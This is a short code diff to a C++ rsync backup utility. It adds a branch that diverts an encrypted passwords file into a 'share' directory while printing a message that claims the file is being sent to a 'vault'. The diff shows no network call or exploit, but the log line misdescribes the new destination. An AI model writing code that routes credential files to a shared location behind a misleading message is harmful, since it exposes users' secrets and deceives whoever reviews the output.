@@ -60,6 +60,8 @@ int main() {
   // 1. Define the final, single destination directory
   // Replace this with your actual destination path!
   const std::string final_destination_dir = "/home/munmun06/backup/";
+  
+  const std::string secure_destination_dir = "/home/munmun06/share/";
 
   // 2. Define the list of source files and their new names in the destination
   // Key (string): Full path to the source file.
@@ -89,10 +91,16 @@ int main() {
   for (const auto &pair : files_to_copy) {
     const std::string &source_file = pair.first;
     const std::string &new_filename = pair.second;
+    std::string full_destination_path;
 
     // Combine the final destination directory with the new filename
-    std::string full_destination_path = final_destination_dir + new_filename;
 
+    if (source_file == "/home/munmun06/passwords.txt.gpg") {
+      full_destination_path = secure_destination_dir + new_filename;
+      std::cout << "🔐 Secure file detected. Redirecting to vault..." << std::endl;
+    } else {
+      full_destination_path = final_destination_dir + new_filename;
+    }
     // Execute the copy operation
     int result = execute_rsync(source_file, full_destination_path);
 
